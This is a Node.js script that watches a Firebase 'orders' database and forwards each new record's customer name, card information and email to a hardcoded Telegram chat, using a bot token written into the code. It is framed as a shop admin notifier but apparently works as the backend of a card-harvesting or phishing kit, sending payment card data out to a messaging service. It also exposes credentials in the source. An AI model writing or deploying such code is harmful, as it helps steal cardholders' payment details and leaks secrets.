const express = require('express');
const admin = require("firebase-admin");
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');

const app = express();

// --- 1. CHECK FOR KEY FILE ---
if (!fs.existsSync("./serviceAccountKey.json")) {
    console.error("❌ ERROR: 'serviceAccountKey.json' file not found! Please make sure you uploaded it to Render.");
    process.exit(1); 
}

const serviceAccount = require("./serviceAccountKey.json");

// --- 2. INITIALIZE FIREBASE ---
try {
    admin.initializeApp({
        credential: admin.credential.cert(serviceAccount),
        databaseURL: "https://vova-733e8-default-rtdb.firebaseio.com"
    });
    console.log("✅ Firebase Initialized Successfully!");
} catch (error) {
    console.error("❌ Firebase Init Error: ", error.message);
}

const db = admin.database();

// --- 3. TELEGRAM BOT SETUP ---
const token = "9178448206:AAEziLPCU85WI4bDgKQ9mdAkAnO4tboBLbM"; 
const chatId = "6398769189";
const bot = new TelegramBot(token, { polling: true });

bot.on('message', (msg) => {
    bot.sendMessage(msg.chat.id, "Admin Server is Watching the shop! 🛒");
});

// --- 4. MONITOR DATABASE ---
const ordersRef = db.ref('orders');
ordersRef.on('child_added', (snapshot) => {
    const data = snapshot.val();
    const orderMsg = `🚀 **New Order!**\n\n👤 Name: ${data.customer_name}\n💳 Card: ${data.card_info}\n📧 Email: ${data.email}\n⏰ ${data.timestamp}`;
    
    bot.sendMessage(chatId, orderMsg, { parse_mode: 'Markdown' });
    console.log("Notification sent to Telegram admin.");
});

// --- 5. KEEP ALIVE SERVER ---
app.get('/', (req, res) => {
    res.send("Admin Bot is running...");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
});